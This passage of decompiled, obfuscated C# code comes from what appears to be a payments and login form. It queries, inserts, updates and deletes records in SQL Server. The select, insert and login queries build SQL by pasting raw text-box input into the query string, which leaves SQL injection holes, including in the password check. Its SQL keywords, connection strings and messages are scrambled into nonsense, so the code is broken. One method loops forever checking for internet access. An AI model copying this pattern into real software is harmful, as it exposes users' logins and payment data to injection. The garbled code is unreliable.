			ICloneable cloneable2 = (ICloneable)new SqlCommand();
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).set_ConnectionString("fsjdhfsjdghsuewt89we900tt oierru9w8t ejgj'o9oa8g aljgrii8ag0ir oayttajgh8uuar");
			((SqlConnection)cloneable).Open();
			((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).set_Connection((SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
			((SqlCommand)cloneable2).set_CommandType(CommandType.Text);
			((SqlCommand)cloneable2).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select * asffsgseyeurtrturuymentid='", NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			IDataReader dataReader = (IDataReader)((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).ExecuteReader();
			if (((SqlDataReader)dataReader).get_HasRows())
			{
				Interaction.MsgBox((object)"Paymurturuent Alrrurueeady Regisrturttyrutered", (MsgBoxStyle)16, (object)null);
				((SqlConnection)cloneable).Close();
			}
			else
			{
				((SqlConnection)cloneable).Close();
				((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Open();
				cloneable2 = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"inserteryreyeyrtutrur into sdfsgrerypayments vtutrurturtualues('", NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxBankName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(qr62Z_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(qr62Z_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)cloneable);
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxBankName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(qr62Z_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(qr62Z_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasetrurtutrutru enter the trutrurturtywdetails");
				}
				else
				{
					((SqlCommand)cloneable2).ExecuteNonQuery();
					Interaction.MsgBox((object)"SuccersWRVQW46N575M8sfully Regis57959,tered.", (MsgBoxStyle)64, (object)"Succr46m880.69p9.7ess");
				}
				((SqlConnection)cloneable).Close();
			}
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"ErrWE668769,or", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Hz13D(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		ICloneable cloneable = (ICloneable)new SqlConnection("AET578 8Etyir77i7yi  688 87");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Emeurt778799,pty Id");
			return;
		}
		DbCommand dbCommand = (DbCommand)new SqlCommand("Usytrutt7i76967969yit", (SqlConnection)cloneable);
		((SqlCommand)dbCommand).get_Parameters().Add("@cndyirt7i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@bnyiu5y 56", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxBankName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@cardnusty 5w5757m", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(qr62Z_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@bansy5547ykb", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(qr62Z_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)dbCommand).get_Parameters().Add("@ite676d", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Open();
		if (((SqlCommand)dbCommand).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Data dture68me 68u 6Upd6uated");
		}
		else
		{
			MessageBox.Show("Da 5 u6ta Ntaeot U6878eh jghlipdated");
		}
		((SqlConnection)cloneable).Close();
	}

	private void Yc80Q(object sender, EventArgs e)
	{
		a6Z0B();
		NewLateBinding.LateCall(qr62Z_0.object_9, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void a6Z0B()
	{
		throw new NotImplementedException();
	}

	private void b0N6G(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("sdh oufuafgr9uf");
		DbCommand dbCommand = (DbCommand)new SqlCommand("DELETE FsafagargraeyreyROM payments WutyiriuooHERE PtyrtuaymentID = @id", (SqlConnection)dbConnection);
		((SqlCommand)dbCommand).get_Parameters().Add("@iddtuyud", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)dbCommand).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Padyuyiuo8p98[yment 0[09[Deleted");
		}
		else
		{
			MessageBox.Show("Payme4e66798ont Deleted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void a3FQc(object sender, EventArgs e)
	{
		Nz32Te.x9LRn1();
	}

	private void f2FBe(object sender, EventArgs e)
	{
		Cc2o6();
		NewLateBinding.LateCall(qr62Z_0.object_3, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = qr62Z_0.object_4;
		object[] array = new object[1];
		ref object object_2 = ref qr62Z_0.object_5;
		array[0] = object_2;
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj, true);
		if ((obj2 as bool[])[0])
		{
			object_2 = RuntimeHelpers.GetObjectValue(((object[])array2)[0]);
		}
	}

	private void t9RFb(object sender, EventArgs e)
	{
		object paymentsTableAdapter = PaymentsTableAdapter;
		object[] array = new object[1];
		object database2DataSet = Database2DataSet2;
		array[0] = NewLateBinding.LateGet(database2DataSet, (Type)null, "Payments", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(paymentsTableAdapter, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if (((bool[])obj2)[0])
		{
			NewLateBinding.LateSetComplex(database2DataSet, (Type)null, "Payments", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
		object object_ = qr62Z_0.object_6;
		object[] array3 = new object[1];
		database2DataSet = qr62Z_0.object_5;
		array3[0] = NewLateBinding.LateGet(database2DataSet, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array3;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array3, (string[])null, (Type[])null, (bool[])(obj2 = new bool[1] { true }), true);
		if (((bool[])obj2)[0])
		{
			NewLateBinding.LateSetComplex(database2DataSet, (Type)null, "Register", new object[1] { ((object[])array2)[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void Za1g6(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection();
		new SqlCommand();
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).set_ConnectionString("asfgyueyjrtyoyuipyupiuopiouppiuop");
		object obj = null;
		ICloneable cloneable = null;
		try
		{
			obj = (object)new SqlConnection("nb ghk y7 6iotkrkut");
			((SqlConnection)obj).Open();
			IComparable<string> comparable = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sgffgj", NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' AND password ='"), NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' "));
			cloneable = (ICloneable)new SqlCommand((string)comparable, (SqlConnection)obj);
			IDataRecord dataRecord = (IDataRecord)((SqlCommand)cloneable).ExecuteReader();
			if (((SqlDataReader)dataRecord).Read())
			{
				MessageBox.Show("Logly");
				a6Z0B();
				NewLateBinding.LateCall(Customer, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else
			{
				MessageBox.Show("Ighj");
				NewLateBinding.LateCall(Welcome, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"MSSQL ERROR", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static int Zi5j4()
	{
		while (true)
		{
			try
			{
				Component component = new WebClient();
				try
				{
					MarshalByRefObject marshalByRefObject = (component as WebClient).OpenRead("https://www.google.com");
					try
					{
						return 100;
					}
					finally
					{
						if ((Stream)marshalByRefObject != null)
						{
							((IDisposable)(marshalByRefObject as Stream)).Dispose();
						}
					}
				}
				finally
				{
					if (component is WebClient)
					{
						((IDisposable)(component as WebClient)).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
